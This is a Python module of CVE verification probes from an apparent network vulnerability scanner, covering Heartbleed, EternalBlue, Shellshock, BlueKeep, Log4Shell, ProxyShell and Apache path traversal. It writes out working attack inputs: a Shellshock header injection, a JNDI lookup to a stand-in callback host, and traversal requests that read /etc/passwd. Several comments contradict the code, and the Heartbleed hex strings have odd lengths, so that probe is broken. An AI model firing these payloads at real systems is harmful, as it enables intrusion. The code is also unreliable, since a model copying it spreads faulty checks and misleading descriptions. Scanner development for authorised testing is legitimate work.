"""Verification probes — confirm-don't-exploit checks for top CVEs.

Each probe sends ONE minimal protocol-correct request that distinguishes
"vulnerable" from "patched" without triggering the actual exploit. This
is the difference between "version-matched CVE" (high false-positive risk)
and "confirmed vulnerable" (high confidence).

These check techniques are widely-published and used by Nessus/OpenVAS/
Qualys. We implement enough to confirm critical exposures, not enough to
actually exploit them.

LEGAL: Some of these *touch* protocol state. Use only on authorized targets.
"""

from __future__ import annotations

import logging
import socket
import ssl
import struct
import time
from typing import Optional

log = logging.getLogger(__name__)


# ── Heartbleed (CVE-2014-0160) ────────────────────────────────────────────
def check_heartbleed(host: str, port: int = 443,
                      timeout: float = 5.0) -> Optional[dict]:
    """Send a TLS heartbeat with mismatched length. Vulnerable servers reply."""
    # TLS Client Hello (minimal, TLS 1.2)
    client_hello = bytes.fromhex(
        "16030200dc"  # TLS Handshake, TLS 1.2, length 220
        "010000d8"   # Client Hello, length 216
        "0303"        # client version TLS 1.2
        + "00" * 32   # random
        + "00"         # session ID len
        + "001c"        # cipher suites len (28)
        + "c014c00ac02fc02bc013c00900330039002fc0050035000a"
        + "01"           # compression methods len
        + "00"           # null compression
        + "0093"         # extensions length
        + "000b000403000102"     # ec point formats
        + "000a001c001a00170019001c001b0018001a0016000e000d000b000c0009000a"
        + "000d00200017"
        + "00020101010301040105010601020203020403020205020"
        + "020201"
        + "000f000101"
    )
    # Heartbeat: type=01 (request), len=4000 (huge — bug), payload=01
    heartbeat = bytes.fromhex(
        "18030200030140001"  # type 24 (heartbeat) tls12 len 3
        "0140001"             # heartbeat request, claim 16384 bytes
    )

    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        sock.sendall(client_hello)
        # Read server hello sequence (just drain a bit)
        time.sleep(0.3)
        sock.recv(8192)
        sock.sendall(heartbeat)
        time.sleep(0.5)
        resp = sock.recv(4096)
        sock.close()
    except (socket.timeout, OSError):
        return None

    # Vulnerable servers return more bytes than they should (heartbeat memory leak)
    # The header is 5 bytes; a vulnerable response contains >> 3 bytes of payload.
    if resp and len(resp) > 18 and resp[0] == 0x18:
        return {
            "cve": "CVE-2014-0160",
            "name": "Heartbleed",
            "status": "vulnerable",
            "severity": "CRITICAL",
            "evidence_bytes": len(resp),
            "note": ("Server returned heartbeat with unexpected payload — "
                     "memory leak possible (Heartbleed)"),
        }
    return None


# ── MS17-010 / EternalBlue ────────────────────────────────────────────────
def check_eternalblue(host: str, port: int = 445,
                       timeout: float = 5.0) -> Optional[dict]:
    """Probe SMBv1 for the specific EternalBlue trigger condition.

    We send SMB1 NEGOTIATE, then check whether the server responds AND
    whether the dialect indicates SMBv1 acceptance (the vuln family).
    """
    smb_negotiate = bytes.fromhex(
        "00000054ff534d4272000000001853c0000000000000000000000000ffff"
        "0000000031000262504320323002504320323002504320323002504320323002504320"
        "32320021"
    )
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        sock.sendall(smb_negotiate)
        data = sock.recv(2048)
        sock.close()
    except (socket.timeout, OSError):
        return None

    if not data or len(data) < 36:
        return None

    # SMB1 marker = 0xff534d42 ("\xffSMB"). EternalBlue requires SMBv1.
    if data[4:8] != b"\xffSMB":
        return None

    # Status: 0x00000000 = success
    nt_status = struct.unpack("<I", data[9:13])[0] if len(data) >= 13 else None
    return {
        "cve": "CVE-2017-0144",
        "name": "EternalBlue (MS17-010)",
        "status": "potentially_vulnerable",
        "severity": "CRITICAL",
        "smb_version": "SMBv1 enabled",
        "nt_status_hex": f"0x{nt_status:08x}" if nt_status is not None else None,
        "note": ("SMBv1 protocol accepted — required precondition for MS17-010. "
                 "Run `nmap --script smb-vuln-ms17-010` for definitive check."),
    }


# ── Shellshock (CVE-2014-6271) ────────────────────────────────────────────
def check_shellshock(host: str, port: int = 80, *,
                      tls: bool = False, paths: Optional[list[str]] = None,
                      timeout: float = 4.0) -> Optional[dict]:
    """Test CGI endpoints for Shellshock bash function injection.

    Sends a benign payload that, if Bash is vulnerable, results in a banner
    string echoed in the response body. No code execution attempted.
    """
    paths = paths or ["/cgi-bin/test.cgi", "/cgi-bin/test.sh",
                       "/cgi-bin/printenv", "/cgi-bin/status",
                       "/cgi-bin/wlogin.sh"]
    payload = "() { :;}; echo; echo X-Shellshock: vulnerable"
    for path in paths:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if tls:
                ctx = ssl._create_unverified_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            req = (
                f"GET {path} HTTP/1.0\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {payload}\r\n"
                f"Cookie: {payload}\r\n"
                f"Referer: {payload}\r\n"
                f"\r\n"
            ).encode()
            sock.sendall(req)
            data = sock.recv(8192)
            sock.close()
        except (socket.timeout, OSError, ssl.SSLError):
            continue
        if b"X-Shellshock: vulnerable" in data:
            return {
                "cve": "CVE-2014-6271",
                "name": "Shellshock",
                "status": "vulnerable",
                "severity": "CRITICAL",
                "path": path,
                "note": "Bash function injection succeeded in CGI environment",
            }
    return None


# ── BlueKeep (CVE-2019-0708) — RDP pre-auth RCE ──────────────────────────
def check_bluekeep(host: str, port: int = 3389,
                    timeout: float = 5.0) -> Optional[dict]:
    """Probe for the precondition (vulnerable Windows version exposed RDP)."""
    # X.224 CR with CredSSP+TLS negotiation — same as our RDP NTLM check
    # The vulnerability is in the MS_T120 virtual channel handling.
    # We just confirm the host is Windows pre-Server-2019 with RDP exposed.
    from ..fingerprint.service_probes_v2 import probe_rdp_ntlm
    rdp_info = probe_rdp_ntlm(host, port, timeout=timeout)
    if not rdp_info:
        return None
    os_ver = rdp_info.get("os_version", "")
    # BlueKeep affects: Windows 7, Server 2008/2008R2, Windows XP, Vista
    # OS version 6.0/6.1/5.x are affected. 10.0 is Windows 10/Server 2016+ (patched).
    affected_majors = {"5", "6"}
    major = os_ver.split(".")[0] if os_ver else ""
    if major in affected_majors:
        return {
            "cve": "CVE-2019-0708",
            "name": "BlueKeep",
            "status": "potentially_vulnerable",
            "severity": "CRITICAL",
            "os_version": os_ver,
            "note": (f"Windows version {os_ver} is in the BlueKeep-affected range. "
                     "Verify patch status (KB4499175) before confirming."),
        }
    return None


# ── Log4Shell (CVE-2021-44228) — DNS-callback test ───────────────────────
def check_log4shell(host: str, port: int = 80, *,
                     tls: bool = False, paths: Optional[list[str]] = None,
                     timeout: float = 4.0) -> Optional[dict]:
    """Test Log4Shell via JNDI lookup payload.

    Without a callback infrastructure we can't confirm exploitation. We only
    flag this as 'untested — manual confirmation needed' since the safe
    detection requires a Burp Collaborator-style OOB callback.
    """
    paths = paths or ["/", "/login", "/api", "/api/login"]
    # Just check if the host responds to HTTP at all — flag for manual follow-up.
    for path in paths:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if tls:
                ctx = ssl._create_unverified_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            req = (
                f"GET {path} HTTP/1.0\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: ${{jndi:ldap://canary.example/explotica}}\r\n"
                f"X-Api-Version: ${{jndi:ldap://canary.example/explotica}}\r\n"
                f"\r\n"
            ).encode()
            sock.sendall(req)
            data = sock.recv(4096)
            sock.close()
        except (socket.timeout, OSError, ssl.SSLError):
            continue
        if data:
            return {
                "cve": "CVE-2021-44228",
                "name": "Log4Shell (untested without callback)",
                "status": "indeterminate",
                "severity": "INFO",
                "path": path,
                "note": ("Payload sent. Confirmation requires DNS callback "
                         "infrastructure (Burp Collaborator / interactsh). "
                         "Cannot determine vulnerability from response alone."),
            }
    return None


# ── ProxyShell (CVE-2021-34473) — Exchange ────────────────────────────────
def check_proxyshell(host: str, port: int = 443,
                      timeout: float = 4.0) -> Optional[dict]:
    """Test for Exchange ProxyShell endpoint accessibility."""
    paths = ["/autodiscover/autodiscover.json", "/owa/auth/x.js"]
    for path in paths:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            ctx = ssl._create_unverified_context()
            sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(
                f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n".encode()
            )
            data = sock.recv(2048)
            sock.close()
        except (socket.timeout, OSError, ssl.SSLError):
            continue
        if b"X-FEServer" in data or b"X-CalculatedBETarget" in data:
            return {
                "cve": "CVE-2021-34473",
                "name": "ProxyShell (Exchange)",
                "status": "exposed",
                "severity": "CRITICAL",
                "endpoint": path,
                "note": ("Exchange Autodiscover endpoint exposed. Check "
                         "patch level vs CU 21 / CU 22."),
            }
    return None


# ── Apache Path Traversal (CVE-2021-41773) ────────────────────────────────
def check_apache_path_traversal(host: str, port: int = 80, *,
                                 tls: bool = False,
                                 timeout: float = 4.0) -> Optional[dict]:
    """Test CVE-2021-41773 traversal via /.%2e/.%2e/etc/passwd"""
    paths = ["/.%2e/.%2e/.%2e/.%2e/etc/passwd",
             "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"]
    for path in paths:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if tls:
                ctx = ssl._create_unverified_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(
                f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n".encode()
            )
            data = sock.recv(8192)
            sock.close()
        except (socket.timeout, OSError, ssl.SSLError):
            continue
        # Look for the typical /etc/passwd format
        if b"root:" in data and b"/bin/" in data:
            return {
                "cve": "CVE-2021-41773",
                "name": "Apache Path Traversal",
                "status": "vulnerable",
                "severity": "CRITICAL",
                "path": path,
                "note": "Apache returned /etc/passwd content via path traversal",
            }
    return None


# ── Dispatch ──────────────────────────────────────────────────────────────
PORT_PROBES = {
    443: [check_heartbleed, check_proxyshell],
    8443: [check_heartbleed],
    445: [check_eternalblue],
    3389: [check_bluekeep],
    80: [check_shellshock, check_log4shell, check_apache_path_traversal],
    8080: [check_shellshock, check_log4shell],
    8000: [check_log4shell],
}


def verify_host(host_ip: str, ports: list[int],
                timeout: float = 5.0) -> list[dict]:
    """Run all verification probes against open ports on a host."""
    findings: list[dict] = []
    for p in ports:
        if p not in PORT_PROBES:
            continue
        for probe in PORT_PROBES[p]:
            try:
                r = probe(host_ip, p, timeout=timeout)
                if r:
                    findings.append(r)
            except TypeError:
                # Some probes don't take port kwarg
                try:
                    r = probe(host_ip, timeout=timeout)
                    if r:
                        findings.append(r)
                except Exception as e:
                    log.debug("probe %s on %s:%d failed: %s",
                              probe.__name__, host_ip, p, e)
            except Exception as e:
                log.debug("probe %s on %s:%d failed: %s",
                          probe.__name__, host_ip, p, e)
    return findings


def verify_scan(scan_dict: dict) -> dict[str, list[dict]]:
    """Run verification probes against every host in a scan."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    out: dict[str, list[dict]] = {}

    def work(h):
        ports = [p["number"] for p in h.get("ports", [])]
        return (h["ip"], verify_host(h["ip"], ports))

    with ThreadPoolExecutor(max_workers=16) as pool:
        for f in as_completed([pool.submit(work, h)
                                for h in scan_dict.get("hosts", [])]):
            try:
                ip, findings = f.result()
                if findings:
                    out[ip] = findings
            except Exception as e:
                log.debug("verify worker error: %s", e)
    return out
